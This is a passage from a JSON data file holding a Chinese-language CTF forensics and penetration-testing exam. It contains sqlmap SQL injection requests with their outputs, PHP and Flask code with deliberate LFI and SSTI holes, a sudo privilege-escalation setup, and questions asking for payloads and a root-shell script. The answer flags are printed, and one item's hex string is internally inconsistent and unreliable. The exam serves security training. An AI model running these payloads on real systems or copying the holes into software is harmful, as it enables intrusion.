Scott,4111-2222-3333-4444,555-0200,sophia@example.com\n\n10,Logan Green,5500-1111-2222-3333,555-0201,logan@example.com\n\n11,0liver Baker,3400-5555-6666-7777,555-0202,oliver@example.com\n\n12,William Adams,4000-1234-5678-9010,555-0203,william@example.com\n\n13,_ack Nelson,5100-9999-8888-7777,555-0204,jack@example.com\n\n14,Lucas Carter,4532-0000-1111-2222,555-0205,lucas_c@example.com\n\n15,3velyn Mitchell,3700-1122-3344-5566,555-0206,evelyn@example.com\n\n16,4lexander Perez,6011-9988-7766-5544,555-0207,alex@example.com\n\n17,Kevin Roberts,4024-5566-7788-9900,555-0208,kevin@example.com\n\n18,_athan Turner,5412-1111-2222-3333,555-0209,nathan@example.com\n\n19,Thomas Phillips,4556-7777-8888-9999,555-0210,thomas@example.com\n\n20,Henry Campbell,3528-9988-7766-5544,555-0211,henry@example.com\n\n21,Ryan Parker,4111-0000-9999-8888,555-0212,ryan@example.com\n\n22,Ulysses Evans,5500-3333-4444-5555,555-0213,ulysses@example.com\n\n23,_ane Edwards,3400-1111-2222-3333,555-0214,jane@example.com\n\n24,David Collins,4000-5555-6666-7777,555-0215,david@example.com\n\n25,Noah Stewart,5100-2222-3333-4444,555-0216,noah@example.com\n\n26,Sophia Sanchez,4532-9999-8888-7777,555-0217,sophia_s@example.com\n\n27,5amuel Morris,3700-4444-5555-6666,555-0218,samuel_m@example.com\n\n28,3mma Rogers,6011-1111-2222-3333,555-0219,emma@example.com\n\n29,}achary Reed,4024-8888-9999-0000,555-0220,zachary@example.com\n\n```"
    },
    {
      "part": 3,
      "title": "【證據 G：traffic.pcap 之 HTTP 攻擊流節錄】",
      "raw_title": "證據 G：traffic.pcap 之 HTTP 攻擊流節錄",
      "content": "```http\n\nGET /sqli/index.php?id=1%27%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--+ HTTP/1.1\n\nHost: target.internal.corp\n\nUser-Agent: sqlmap/1.6#stable (https://sqlmap.org)\n\nAccept: */*\n\n\n\nHTTP/1.1 200 OK\n\nContent-Type: text/html; charset=UTF-8\n\nContent-Length: 184\n\n\n\n<!-- Output: 1 | ctf_flags | 3 -->\n\n\n\n--- 下一個請求 ---\n\n\n\nGET /sqli/index.php?id=1%27%20UNION%20SELECT%201,flag_val,3%20FROM%20ctf_flags--+ HTTP/1.1\n\nHost: target.internal.corp\n\nUser-Agent: sqlmap/1.6#stable (https://sqlmap.org)\n\n\n\nHTTP/1.1 200 OK\n\nContent-Type: text/html; charset=UTF-8\n\n\n\n<!-- Output: 1 | flag{sql_1nj3ct10n_m4st3r_2026} | 3 -->\n\n```"
    },
    {
      "part": 3,
      "title": "【實戰封包與隱寫問題 52 ~ 81】",
      "raw_title": "實戰封包與隱寫問題 52 ~ 81",
      "content": "- **第 52 題**：根據【證據 E】，在 `Topic1.pcap` 中，DNS 外洩通道所查詢的頂層權威網域名稱（Domain）為何？  \n\n  【作答區】：____________________\n\n- **第 53 題**：根據【證據 E】，子域名最前端的 `s000`、`s001` 等字串其具體作用為何？  \n\n  【作答區】：____________________\n\n- **第 54 題**：根據【證據 E】，子域名資料負載所採用的編碼字符集僅包含大寫字母 `A-Z` 與數字 `2-7`，此特徵符合哪一種標準編碼演算法？  \n\n  【作答區】：____________________\n\n- **第 55 題**：在 RFC 4648 規範中，Base32 編碼的填充字元（Padding）通常為何？  \n\n  【作答區】：____________________\n\n- **第 56 題**：根據【證據 E】，從第一個外洩請求 `s000` 到最後一個 `s061`，攻擊者總共發送了多少個 DNS 查詢分片？  \n\n  【作答區】：____________________\n\n- **第 57 題**：根據【證據 F】，解碼還原後的檔案格式為何？該檔案的表頭欄位包含哪些？  \n\n  【作答區】：檔案格式：____________，欄位：____________\n\n- **第 58 題**：根據【證據 F】，外洩資料中共有多少名客戶的敏感資料遭到外洩？  \n\n  【作答區】：____________________\n\n- **第 59 題**：【隱寫密碼學考點】請仔細觀察【證據 F】中第 1 筆至第 29 筆客戶資料中 `name` 欄位的第一個字元（Vertical First Character）：  \n\n  `S, k, i, l, l, 5, 4, {, s, l, 0, w, _, l, 3, 4, k, _, t, h, r, u, _, d, n, s, 5, 3, }`  \n\n  請將這 29 個字元按垂直順序直接拼出隱藏在此外洩資料中的 Flag！  \n\n  【作答區（Flag）】：____________________\n\n- **第 60 題**：根據【證據 G】，攻擊者所使用的自動化注入工具名稱與版本號為何？  \n\n  【作答區】：____________________\n\n- **第 61 題**：根據【證據 G】，攻擊者發動的 SQL 注入技術類型為何？注入點所查詢的資料表名稱為何？  \n\n  【作答區】：技術類型：____________，資料表名稱：____________\n\n- **第 62 題**：根據【證據 G】，攻擊者最終從 `ctf_flags` 資料表中提取出的 Flag 為何？  \n\n  【作答區（Flag）】：____________________\n\n- **第 63 題**：若要在 Wireshark 中僅過濾顯示 `Topic1.pcap` 中所有的 DNS 查詢請求封包，應輸入何種顯示過濾表達式？  \n\n  【作答區】：____________________\n\n- **第 64 題**：若使用 `tshark` 命令列工具從 `Topic1.pcap` 中直接提取所有 DNS 查詢的主機名稱並導出至文字檔，應下達何種指令？  \n\n  【作答區】：____________________\n\n- **第 65 題**：在 HTTP 攻擊封包中，若攻擊者使用了 `load_file('/etc/passwd')`，該函數在 MySQL 中能夠成功執行的兩個必要系統變數條件為何？  \n\n  【作答區】：____________________\n\n- **第 66 題**：若封包中發現某個 TCP 請求包含字串 `0x7f 0x45 0x4c 0x46`，這代表被傳輸的檔案為何種類型的檔案？  \n\n  【作答區】：____________________\n\n- **第 67 題**：在 Wireshark 中，若要搜尋所有包含字串 `flag{` 的 TCP 數據流，應使用何種過濾語法？  \n\n  【作答區】：____________________\n\n- **第 68 題**：若封包中出現透過 FTP 傳輸的明文憑證：`USER admin` 與 `PASS P@ssw0rd123`，該 FTP 連線所使用的標準控制端口為何？  \n\n  【作答區】：____________________\n\n- **第 69 題**：在 SSL/TLS 封包解密中，若鑑識人員擁有伺服器的私鑰或瀏覽器導出的 `SSLKEYLOGFILE`，在 Wireshark 的哪一個設定選單中載入該金鑰檔案即可將 HTTPS 密文即時解密為明文 HTTP？  \n\n  【作答區】：____________________\n\n- **第 70 題**：在 PNG 圖片隱寫中，若圖片在瀏覽器或相片檢視器中無法正常開啟，但十六進位查看開頭為 `89 50 4E 47 0D 0A 1A 0A`，隨後為 `IHDR` 塊。若寬高數值被攻擊者人為修改為 0，此種隱寫技術稱之為何？如何修復？  \n\n  【作答區】：隱寫技術：____________，修復方式：____________\n\n- **第 71 題**：在音訊隱寫中，若攻擊者將 Flag 調製成高頻聲音信號隱匿於 WAV 檔案中，鑑識人員應使用何種工具（如 Audacity）切換為何種檢視模式（波形圖 / 頻譜圖）來直觀讀取 Flag 文字？  \n\n  【作答區】：工具：____________，檢視模式：____________\n\n- **第 72 題**：在 ZIP 壓縮檔分析中，若解壓縮時提示需要密碼，但十六進位查看所有檔案頭的加密標誌位（General Purpose Bit Flag）第 0 位元均為奇數（`0x09 00`），且經判斷為偽加密（Pseudo-encryption），應修改哪一個位元組使其變為無密碼？  \n\n  【作答區】：____________________\n\n- **第 73 題**：若一段密文字串為 `5a6d78685a33743061476c7a5f61573566643239796247513d`，觀察其全部由十六進位字元組成。將其十六進位轉為字串後得到 `ZmxhZ3t0aGlzX2aw5fd29ybGQ=`，再將其進行 Base64 解碼後的明文 Flag 為何？  \n\n  【作答區（Flag）】：____________________\n\n- **第 74 題**：在古典密碼中，若明文字串 `HELLO` 經凱撒密碼（Caesar Cipher）位移 3 位（ROT3）加密後，生成的密文字串為何？  \n\n  【作答區】：____________________\n\n- **第 75 題**：若密文字串為 `g1014308{`，已知其為 ROT13 加密，解密後的開頭英文字母為何？  \n\n  【作答區】：____________________\n\n- **第 76 題**：在雜湊值破解中，若在 Linux `/etc/shadow` 中截獲一組密碼雜湊：`$1$admin$eP96...`，若要使用 `john` 或 `hashcat` 進行字典爆破，`hashcat` 的模式代碼（-m）針對 MD5-Crypt 應設定為何？  \n\n  【作答區】：____________________\n\n- **第 77 題**：在封包中發現可疑 ICMP 請求，其 Data 欄位固定為 16 位元組且隨時間遞增，此封包可能正被用於何種秘密通訊？  \n\n  【作答區】：____________________\n\n- **第 78 題**：Wireshark 的「追蹤串流」（Follow Stream）功能中，TCP Stream 追蹤器通常以哪兩種顏色分別表示客戶端上傳流量與伺服器下行回顯？  \n\n  【作答區】：____________________\n\n- **第 79 題**：在 PCAP 封包中，若發現攻擊者發送了大量包含 `User-Agent: () { :; }; /bin/bash -c \"...\"` 的 HTTP 請求，此特徵對應哪一個著名的歷史漏洞？  \n\n  【作答區】：____________________\n\n- **第 80 題**：若在封包中捕獲到一個包含 Exif 資訊的 JPEG 圖片，欲在 Linux 終端機中快速讀取其 GPS 經緯度或備註中的 Flag，最常用的命令列工具名稱為何？  \n\n  【作答區】：____________________\n\n- **第 81 題**：針對 DNS 隱寫資料外洩，企業在防火牆或 DNS 防護設備上應配置何種檢測策略以有效阻斷此類攻擊？  \n\n  【作答區】：____________________"
    },
    {
      "part": 4,
      "title": "【情境背景說明】",
      "raw_title": "情境背景說明",
      "content": "隊員分發到一台目標靶機（IP：`10.10.10.128`），滲透測試授權範圍涵蓋外部服務探測、Web 漏洞利用、本機特權提升與終端 Flag 取得。靶機環境掃描與服務狀態如下。"
    },
    {
      "part": 4,
      "title": "【證據 H：Nmap 全端口掃描報告 (nmap -sV -sC -p- 10.10.10.128)】",
      "raw_title": "證據 H：Nmap 全端口掃描報告 (nmap -sV -sC -p- 10.10.10.128)",
      "content": "```text\n\nPORT     STATE SERVICE VERSION\n\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n\n|_http-title: Corporate Portal - Secure Document Vault\n\n3306/tcp open  mysql   MySQL 5.7.38\n\n| mysql-info: \n\n|_  Protocol: 10, Version: 5.7.38\n\n8080/tcp open  http-proxy Werkzeug/2.0.2 Python/3.8.10\n\n|_http-title: Internal API Console\n\n```"
    },
    {
      "part": 4,
      "title": "【證據 I：Web 80 端口關鍵原始碼節錄 (/vault/view.php)】",
      "raw_title": "證據 I：Web 80 端口關鍵原始碼節錄 (/vault/view.php)",
      "content": "```php\n\n<?php\n\n$page = $_GET['doc'];\n\nif (isset($page)) {\n\n    // 檢查副檔名白名單\n\n    if (strpos($page, \"report\") !== false) {\n\n        include(\"documents/\" . $page);\n\n    } else {\n\n        die(\"Access Denied: Only report documents allowed!\");\n\n    }\n\n}\n\n?>\n\n```"
    },
    {
      "part": 4,
      "title": "【證據 J：Web 8080 內部 API 後台原始碼節錄 (app.py)】",
      "raw_title": "證據 J：Web 8080 內部 API 後台原始碼節錄 (app.py)",
      "content": "```python\n\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n\n\n@app.route(\"/greet\")\n\ndef greet():\n\n    name = request.args.get(\"name\", \"Guest\")\n\n    # 將使用者輸入直接拼接進模板字串\n\n    template = f\"<h3>Hello, {name}! Welcome to internal console.</h3>\"\n\n    return render_template_string(template)\n\n\n\nif __name__ == \"__main__\":\n\n    app.run(host=\"0.0.0.0\", port=8080)\n\n```"
    },
    {
      "part": 4,
      "title": "【證據 K：本機權限清查與 sudo -l 輸出 (一般使用者 www-data / developer)】",
      "raw_title": "證據 K：本機權限清查與 sudo -l 輸出 (一般使用者 www-data / developer)",
      "content": "```text\n\n$ id\n\nuid=1001(developer) gid=1001(developer) groups=1001(developer)\n\n\n\n$ sudo -l\n\nMatching Defaults entries for developer on target-box:\n\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\n\n\nUser developer may run the following commands on target-box:\n\n    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance/cleanup.py\n\n```\n\n`/opt/maintenance/cleanup.py` 內容：\n\n```python\n\nimport os\n\nimport shutil\n\n\n\nprint(\"[*] Running system maintenance cleanup...\")\n\n# 引用了當前目錄下的 helper 模組\n\nimport helper\n\nhelper.clean_temp()\n\nprint(\"[+] Cleanup complete.\")\n\n```\n\n且目錄 `/opt/maintenance/` 對 `developer` 群組具備**可寫入權限**（`drwxrwxr-x 2 root developer 4096 /opt/maintenance/`）。"
    },
    {
      "part": 4,
      "title": "【實戰靶機渗透問題 82 ~ 93】",
      "raw_title": "實戰靶機渗透問題 82 ~ 93",
      "content": "- **第 82 題**：根據【證據 H】，靶機在 8080 端口運行的 Web 框架與 Python 版本為何？  \n\n  【作答區】：框架：____________，Python 版本：____________\n\n- **第 83 題**：根據【證據 I】，`/vault/view.php` 存在本地檔案包含漏洞（LFI）。若攻擊者想透過目錄遍歷讀取 `/etc/passwd`，且必須繞過 `strpos($page, \"report\")` 白名單檢查，請寫出一組有效的 Payload。  \n\n  【作答區】：____________________\n\n- **第 84 題**：若已取得靶機的日誌寫入權限，攻擊者可藉由包含 Apache 存取日誌 `/var/log/apache2/access.log` 來達成 RCE。此種攻擊技術統稱之為何？  \n\n  【作答區】：____________________\n\n- **第 85 題**：根據【證據 J】，8080 端口上的 `/greet` 路由存在何種漏洞？  \n\n  【作答區】：____________________\n\n- **第 86 題**：承上題，攻擊者欲利用該漏洞驗證代碼執行能力，請寫出透過注入 Python 內建子類別執行系統指令（如 `id`）的標準 SSTI 利用表達式。  \n\n  【作答區】：____________________\n\n- **第 87 題**：攻擊者利用 SSTI 成功在目標靶機上建立反彈 Shell，連回攻擊機監聽端口。請問通常應使用哪一個 Linux 指令在本地終端升級為完整 PTY 互動式 TTY Shell（支援自動補全與 Ctrl+C）？  \n\n  【作答區】：____________________\n\n- **第 88 題**：根據【證據 K】，使用者 `developer` 在執行 `sudo -l` 時被授與了何種特權？  \n\n  【作答區】：____________________\n\n- **第 89 題**：根據【證據 K】，`/opt/maintenance/cleanup.py` 腳本引入了 `import helper`，且目錄 `/opt/maintenance/` 對 `developer` 為可寫。攻擊者應採取何種提權手法以 root 身分執行任意指令？  \n\n  【作答區】：____________________\n\n- **第 90 題**：請寫出在 `/opt/maintenance/` 目錄下建立惡意 `helper.py` 的具體 Python 代碼內容，使其在被 sudo 執行時自動產出一個 root shell 或將 `/bin/bash` 複製並賦予 SUID。  \n\n  【作答區】：____________________\n\n- **第 91 題**：提權至 root 身分後，根目錄下存在檔案 `/root/root_flag.txt`，執行 `cat /root/root_flag.txt` 回顯：`flag{pwn_r00t_pr1v_3sc_c0mpl3t3}`。請記錄此 Flag。  \n\n  【作答區（Flag）】：____________________\n\n- **第 92 題**：為維持 root 權限的持久化（Persistence），攻擊者在 `/root/.ssh/authorized_keys` 中追加了自身的公鑰。管理員在檢查時應比對哪一個系統設定以確保只有合法金鑰能存取？  \n\n  【作答區】：____________________\n\n- **第 93 題**：若要加固【證據 K】中的提權弱點，管理員應對 `/opt/maintenance/` 目錄與 `sudoers` 分別執行何種權限修復？  \n\n  【作答區】：____________________"
    }
  ]
};
